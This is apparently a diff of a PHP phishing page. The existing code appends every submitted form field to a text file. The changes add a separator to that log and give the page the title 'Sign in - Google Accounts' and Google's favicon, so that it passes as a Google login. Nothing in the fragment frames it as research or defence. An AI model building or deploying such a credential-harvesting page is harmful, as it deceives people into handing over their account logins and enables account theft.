@@ -21,6 +21,7 @@
 
 $file = "export/data.txt";
 file_put_contents($file, print_r($_POST, true), FILE_APPEND);
+file_put_contents($file, print_r("<hr/>\n", true), FILE_APPEND);
 
 ?>
 
@@ -29,6 +30,10 @@ file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 
 <html>
 <head>
+
+  <title>Sign in - Google Accounts</title>
+  <link rel="shortcut icon" type="image/png" href="https://www.google.com/s2/favicons?domain=www.google.com"/>
+
 </head>
 <body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
 </body>
